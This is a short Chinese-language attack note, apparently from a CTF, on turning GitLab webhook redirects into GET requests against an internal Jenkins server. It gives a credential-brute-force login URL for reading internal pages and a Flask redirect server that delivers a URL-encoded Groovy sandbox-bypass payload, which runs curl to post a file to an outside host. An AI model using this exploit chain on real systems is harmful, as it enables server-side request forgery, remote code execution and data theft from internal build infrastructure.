# 

Jenkins服务一般会在内网但是防火墙一般会设置允许SCM仓库的webhook去访文。但是webhook的请求都是post且http请求包的很大一部分内容都不可控。但是gitlab的post请求会遵循302跳转重定向，重定向后是get请求因此就构造出了get请求。利用这个get请求可以完成一些攻击。



爆破用户名密码并登录，利用from参数重定向到目标页面来获取目标页面的内容：

```url
http://jenkins.example-domain.com/j_acegi_security_check?j_username=admin&j_password=secretpass123&from=/job/prod_pipeline/1/consoleText&Submit=Sign+in
```

- 如果没有配置身份验证，我们可以让 GitLab Webhook 服务访问 CI 中的任何内部页面，捕获响应并将其呈现给我们。
- 如果配置了身份验证，我们可以尝试暴力破解用户，然后使用凭据访问任何内部页面



利用Get请求去打Jenkins的一些CVE漏洞。开一个服务设一个302跳转：

```python
from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/redirect', methods=['POST'])
def redi():
    return redirect('http://10.207.127.144:32810/?redirect_url=http%3A%2F%2Fjenkins%3A8080%2FsecurityRealm%2Fuser%2Fadmin%2FdescriptorByName%2Forg.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript%2FcheckScript%3Fsandbox%3Dtrue%26value%3Dpublic%20class%20x%20%7Bpublic%20x()%7B%22curl%20-X%20POST%20-d%20%40%2Fflag%20http%3A%2F%2F10.207.127.144:39475/%22.execute()%7D%7D',code=302)

if __name__ == '__main__':
    app.run(debug=True,host="0.0.0.0",port=31801)


```



webhook设置为`http://xxxxx/redirect`，即可实现get请求打内网的Jenkins